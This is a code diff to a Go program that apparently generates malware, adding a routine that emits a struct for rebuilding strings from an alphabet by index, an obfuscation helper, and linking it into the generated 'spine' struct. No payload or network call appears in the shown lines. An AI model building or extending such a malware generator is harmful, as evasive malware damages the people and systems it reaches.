@@ -94,6 +94,31 @@ func generate_crypt(s_json string) string {
 
 //
 //
+// Generates the alpha struct (read rib) of the malware
+//
+//
+func generate_alpha(s_json string) string {
+	data_object := structure.Receive(s_json)
+
+	data_object.Add_go_struct([]string{
+		"type alpha_t struct {",
+		"alphabet []string",
+		"}"})
+
+	data_object.Add_go_function([]string{
+		"func (obj *alpha_t) construct_string(value []int) string {",
+		"to_return := \"\"",
+		"for _, number := range value{",
+		"to_return += obj.alphabet[number]",
+		"}",
+		"return to_return",
+		"}"})
+
+	return structure.Send(data_object)
+}
+
+//
+//
 // Generates the core struct (read spine) of each malware
 //
 //
@@ -105,6 +130,7 @@ func generate_spine(s_json string) string {
 		"variable  var_t",
 		"crypt crypt_t",
 		"path string",
+		"alpha alpha_t",
 		"}"})
 
 	data_object.Add_go_global("var spine spine_t")
